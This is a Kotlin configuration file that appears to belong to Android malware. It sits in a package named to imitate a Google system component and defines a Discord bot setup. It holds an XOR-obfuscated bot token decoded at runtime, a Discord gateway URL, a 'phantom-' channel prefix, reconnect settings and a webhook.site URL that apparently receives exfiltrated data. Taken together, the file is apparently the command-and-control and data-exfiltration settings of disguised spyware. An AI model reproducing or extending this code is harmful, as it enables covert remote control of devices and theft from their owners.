package com.google.system

object DiscordConfig {
    private val TOKEN_KEY = listOf(161, 72, 45, 140, 148, 51, 230, 233, 184, 63, 60, 196, 164, 172, 85, 255)
    private val TOKEN_ENC = listOf(
        236, 28, 124, 244, 218, 73, 191, 219, 246, 107, 109, 246, 233, 214, 28, 204,
        239, 50, 120, 184, 219, 119, 179, 144, 245, 110, 18, 131, 209, 195, 102, 176,
        206, 102, 107, 250, 213, 90, 181, 167, 253, 82, 104, 246, 230, 243, 120, 174,
        234, 125, 96, 214, 252, 11, 142, 131, 204, 123, 109, 178, 203, 249, 0, 177,
        230, 57, 70, 199, 165, 93, 137, 176,
    )

    val BOT_TOKEN: String by lazy {
        val arr = ByteArray(TOKEN_ENC.size) { i ->
            (TOKEN_ENC[i] xor TOKEN_KEY[i % TOKEN_KEY.size]).toByte()
        }
        String(arr)
    }

    const val GATEWAY_URL = "wss://gateway.discord.gg/?v=10&encoding=json"

    const val INTENTS = 33281

    const val CHANNEL_PREFIX = "phantom-"

    const val RECONNECT_BASE_DELAY = 2000L
    const val MAX_RECONNECT_DELAY = 300000L

    const val WEBHOOK_URL = "https://webhook.site/f51becc9-6b6e-4d21-ac85-8c635d986bc0"
}
